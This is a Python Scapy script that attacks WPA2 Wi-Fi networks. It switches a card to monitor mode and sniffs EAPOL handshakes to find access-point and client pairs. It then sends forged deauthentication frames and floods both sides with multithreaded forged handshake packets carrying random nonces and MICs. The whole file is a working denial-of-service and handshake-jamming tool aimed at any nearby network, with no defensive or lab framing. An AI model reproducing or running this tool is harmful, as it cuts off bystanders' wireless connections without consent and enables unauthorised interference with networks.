from scapy.all import *
import random
import threading
import os

eapol_sample_1 = b'\x00\x00\x1a\x00/H\x00\x00\xeb\xad\x91\xaa\x00\x00\x00\x00\x10\x02\x8f\t\xa0\x00\xb4\x00\x00\x00\x88\x02:\x01\xf0\x8av\xfd\x12B\xbc\x96\x80\xb4aQ\xbc\x96\x80\xb4aQ\x00\x00\x00\x00\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x03\x00_\xfe\x00\x8a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\xacW\xc4Z\xb6\xa9\xc0{\x0e\x03\xbb!8\xd76\x89\x07#\x860\xcb\xaa\x83\xcf\x87\x12r=\x7f\x9a\xe3_\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00^\xdca3'
eapol_sample_2 = b'\x00\x00\x1a\x00/H\x00\x00\x1c\xc0\x91\xaa\x00\x00\x00\x00\x10\x16\x8f\t\xa0\x00\xd8\x00\x00\x00\x88\x01\x02\x01\xbc\x96\x80\xb4aQ\xf0\x8av\xfd\x12B\xbc\x96\x80\xb4aQ\x00\x00\x06\x00\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x03\x00w\xfe\x01\n\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00I\xdaU\xb4\xc6}\x9e\xc65Z\xdb\x0e\xb5\xd1W\xf1\x15\xac\xa7qpX\xd8r\xd9\xb4=[\xf9^\xfc\x8e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdd\xbd[\x89}P\x94k\xb3\xe3v#\tB\x03\xb5\x00\x18\xdd\x16\x00P\xf2\x01\x01\x00\x00P\xf2\x04\x01\x00\x00P\xf2\x04\x01\x00\x00P\xf2\x02\xaf\xab\x91\xf5'
eapol_sample_3 = b'\x00\x00\x1a\x00/H\x00\x00!\xc9\x91\xaa\x00\x00\x00\x00\x10\x02\x8f\t\xa0\x00\xb6\x00\x00\x00\x88\x02:\x01\xf0\x8av\xfd\x12B\xbc\x96\x80\xb4aQ\xbc\x96\x80\xb4aQ\x10\x00\x00\x00\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x03\x00y\xfe\x01\xca\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\xacW\xc4Z\xb6\xa9\xc0{\x0e\x03\xbb!8\xd76\x89\x07#\x860\xcb\xaa\x83\xcf\x87\x12r=\x7f\x9a\xe3_\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x92\x9bm\x1e@`\xd2#\xbd\x91\xf6bSm\xc9\x00\x1a\xdd\x18\x00P\xf2\x01\x01\x00\x00P\xf2\x04\x01\x00\x00P\xf2\x04\x01\x00\x00P\xf2\x02\x0c\x00\x145[q'
eapol_sample_4 = b'\x00\x00\x1a\x00/H\x00\x00|\xf7\x91\xaa\x00\x00\x00\x00\x10\x16\x8f\t\xa0\x00\xd8\x00\x00\x00\x88\x01\x02\x01\xbc\x96\x80\xb4aQ\xf0\x8av\xfd\x12B\xbc\x96\x80\xb4aQ\x10\x00\x06\x00\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x03\x00_\xfe\x01\n\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc6\xb4$ocX\x84H\x99\xff\xe2\t\x11raU\x00\x00J/\xeco'

eapol_key_1 = b'\xac\x57\xc4\x5a\xb6\xa9\xc0\x7b\x0e\x03\xbb\x21\x38\xd7\x36\x89\x07\x23\x86\x30\xcb\xaa\x83\xcf\x87\x12\x72\x3d\x7f\x9a\xe3\x5f'
eapol_key_2 = b'\x49\xda\x55\xb4\xc6\x7d\x9e\xc6\x35\x5a\xdb\x0e\xb5\xd1\x57\xf1\x15\xac\xa7\x71\x70\x58\xd8\x72\xd9\xb4\x3d\x5b\xf9\x5e\xfc\x8e'

MIC_1 = b'\xdd\xbd\x5b\x89\x7d\x50\x94\x6b\xb3\xe3\x76\x23\x09\x42\x03\xb5'
MIC_2 = b'\x18\x92\x9b\x6d\x1e\x40\x60\xd2\x23\xbd\x91\xf6\x62\x53\x6d\xc9'
MIC_3 = b'\xc6\xb4\x24\x6f\x63\x58\x84\x48\x99\xff\xe2\x09\x11\x72\x61\x55'


conf.iface = "wlan0" # !!!!!!!!!!!!!!!!!!!!!!!! EDIT


eapol_count = 200

thread_count = 20 # !!!!!! NOT <1

except_mac = []

pkt_thread = []

packet_buffer = {}

for i in range(0,thread_count):
	pkt_thread.append(False)


def on_monitor():
	print('On monitor mode')
	os.system('iwconfig && sudo ifconfig wlan0 down && sudo iwconfig wlan0 mode monitor && sudo ifconfig wlan0 up && sudo iwconfig wlan0 channel 7')
	print('Set monitor mode Succesfully')

def deauth(target_mac,ap_mac):
	pkt = RadioTap()/Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac)/Dot11Deauth(reason=7)
	rand = random.randint(0,50)
	time.sleep(rand*0.1)
	sendp(pkt,verbose=False)
	print('DEAUTH!')


def modify_mac(pkt,arg1,arg2,arg3):
	pkt = RadioTap(pkt)
	pkt[Dot11].addr1 = arg1
	pkt[Dot11].addr2 = arg2
	pkt[Dot11].addr3 = arg3

	return bytes(pkt)


def modify_key(pkt,a,arg):
	arg_num = 0
	for i in range(a,a+len(arg)):
		pkt = pkt[0:i] + arg[arg_num:arg_num+1] + pkt[i+1:len(pkt)]
		arg_num = arg_num + 1
	
	return bytes(pkt)
		


def gen_key(n):
	result = b''

	for i in range(0,n):
		random_key = random.randint(0,16*16-1)
		random_key = format(random_key,'x')
		if len(random_key) == 1:
			random_key = '0' + random_key
		result = result + bytes.fromhex(random_key)

	return result


def gen_pkt(eapol,ap_mac,target_mac):

	random_key_1 = gen_key(32)
	random_key_2 = gen_key(32)

	random_mic_1 = gen_key(16)
	random_mic_2 = gen_key(16)
	random_mic_3 = gen_key(16)

	random_fcs_1 = gen_key(4)
	random_fcs_2 = gen_key(4)
	random_fcs_3 = gen_key(4)
	random_fcs_4 = gen_key(4)

	eapol_1 = eapol[0]
	eapol_2 = eapol[1]
	eapol_3 = eapol[2]
	eapol_4 = eapol[3]

	check_fcs = RadioTap(eapol_1).haslayer(Dot11FCS)
	if check_fcs == True:
		lower_layer = len(eapol_1) - len(bytes(RadioTap(eapol_1)[EAPOL])) - 4
	else:
		lower_layer = len(eapol_1) - len(bytes(RadioTap(eapol_1)[EAPOL]))

	eapol_1 = modify_mac(eapol_1,target_mac,ap_mac,ap_mac)
	eapol_1 = modify_key(eapol_1,lower_layer + 17,random_key_1)
	if check_fcs == True:
		eapol_1 = eapol_1 + random_fcs_1

	eapol_2 = modify_mac(eapol_2,ap_mac,target_mac,ap_mac)
	eapol_2 = modify_key(eapol_2,lower_layer + 17,random_key_2)
	eapol_2 = modify_key(eapol_2,lower_layer + 81,random_mic_1)
	if check_fcs == True:
		eapol_2 = eapol_2 + random_fcs_2

	eapol_3 = modify_mac(eapol_3,target_mac,ap_mac,ap_mac)
	eapol_3 = modify_key(eapol_3,lower_layer + 17,random_key_1)
	eapol_3 = modify_key(eapol_3,lower_layer + 81,random_mic_2)
	if check_fcs == True:
		eapol_3 = eapol_3 + random_fcs_3

	eapol_4 = modify_mac(eapol_4,ap_mac,target_mac,ap_mac)
	eapol_4 = modify_key(eapol_4,lower_layer + 81,random_mic_3)
	if check_fcs == True:
		eapol_4 = eapol_4 + random_fcs_4

	return [eapol_1,eapol_2,eapol_3,eapol_4]


def check_eap_num(pkt):
	pkt = bytes(pkt)
	check_fcs = RadioTap(pkt).haslayer(Dot11FCS)
	if check_fcs == True:
		lower_layer = len(bytes(pkt)) - len(bytes(RadioTap(pkt)[EAPOL])) - 4
	else:
		lower_layer = len(bytes(pkt)) - len(bytes(RadioTap(pkt)[EAPOL])) 
	pkt = bytes(pkt)
	eap_type = format(pkt[lower_layer + 6],'x')
	eap_nonce = format(pkt[lower_layer + 17],'x')
	if eap_type == '8a':
		return 1
	elif eap_type == 'ca':
		return 3
	elif eap_type == 'a':
		if eap_nonce == '0':
			return 4
		else:
			return 2
	else:
		return 0

send_pkt_count = 0


def eapol_jamming(eapol,replay,num,ap_mac,target_mac):
	global send_pkt_count

	for i in range(0,replay):
		pkt = gen_pkt(eapol,ap_mac,target_mac)
		for X in pkt:
			sendp(X,verbose=False)
			send_pkt_count = send_pkt_count +1
		print(send_pkt_count)
		

def thread_eapol_jamming(eapol,ap_mac,target_mac):
	tm_per = eapol_count // thread_count
	tm_extra = eapol_count % thread_count

	multi_thread_eapol_jamming = []

	deauth(target_mac,ap_mac)
	time.sleep(1)	

	for i in range(0,thread_count):
		replay = tm_per
		if i < tm_extra:
			replay = replay + 1
		multi_thread_eapol_jamming.append(threading.Thread(target=eapol_jamming, args=(eapol,replay,i,ap_mac,target_mac)))
		multi_thread_eapol_jamming[i].daemon = True
		multi_thread_eapol_jamming[i].start()

	for i in range(0,thread_count):
		multi_thread_eapol_jamming[i].join()
		print(f'No. {i} thread quit')


thread_handler = []
online_thread_num = []
online_thread_last_num = -1


def multi_thread_handler(thread_num,ap_mac,target_mac):
	global except_mac, online_thread_num, pkt_buffer

	eapol = [False,False,False,False]
	
	time.sleep(1)

	for pkt in packet_buffer[f'{ap_mac}/{target_mac}']:
		eap_num = check_eap_num(pkt)-1
		eapol[eap_num] = pkt

	for i in range(0,4):
		if not eapol[i]:
			eapol[i] = eval(f'eapol_sample_{i+1}')

	thread_eapol_jamming(eapol,ap_mac,target_mac)


	time.sleep(10)

	online_thread_num.remove(thread_num)
	except_mac.remove(f'{ap_mac}/{target_mac}')
	del packet_buffer[f'{ap_mac}/{target_mac}']

	print(f'finish: {ap_mac}/{target_mac}')


def handler(pkt):
	Dot11_len = len(bytes(pkt[Dot11]))
	Radio_len = len(bytes(pkt))

	if Radio_len - Dot11_len >= 16:

		global except_mac, online_thread_last_num, online_thread_num,thread_handler
		
		eap_num = check_eap_num(pkt)
		
		if eap_num == 1 or eap_num == 3:
			ap_mac = pkt[Dot11].addr2
			target_mac = pkt[Dot11].addr1
		elif eap_num == 2 or eap_num == 4:
			ap_mac = pkt[Dot11].addr1
			target_mac = pkt[Dot11].addr2
		else:
			ap_mac = 'X'
			target_mac = 'X'

		if not ap_mac == 'X':
			if not f'{ap_mac}/{target_mac}' in except_mac:
				print(except_mac)
				print(f'{ap_mac}/{target_mac}')
				except_mac.append(f'{ap_mac}/{target_mac}')
				print(except_mac)
				packet_buffer[f'{ap_mac}/{target_mac}'] = [bytes(pkt)]
				
				thread_num = 0
				while(True):
					if not thread_num in online_thread_num:
						break
					else:
						thread_num = thread_num + 1

				if thread_num > online_thread_last_num:
					online_thread_last_num = thread_num

					thread_handler.append(threading.Thread(target=multi_thread_handler, args=(thread_num,ap_mac,target_mac)))
				else:
					thread_handler[thread_num] = threading.Thread(target=multi_thread_handler, args=(thread_num,ap_mac,target_mac))
			
				online_thread_num.append(thread_num)
				thread_handler[thread_num].daemon = False
				thread_handler[thread_num].start()

			packet_buffer[f'{ap_mac}/{target_mac}'].append(bytes(pkt))


def search_connection():
	sniff(prn=handler, filter='ether proto 0x888e', monitor=True)


def search_test():
	sniff(offline='eap.pcapng',filter='ether proto 0x888e', prn=handler)


def start():
	thread_search = threading.Thread(target=search_connection)
	thread_search.daemon = True
	thread_search.start()
	thread_search.join()

start()
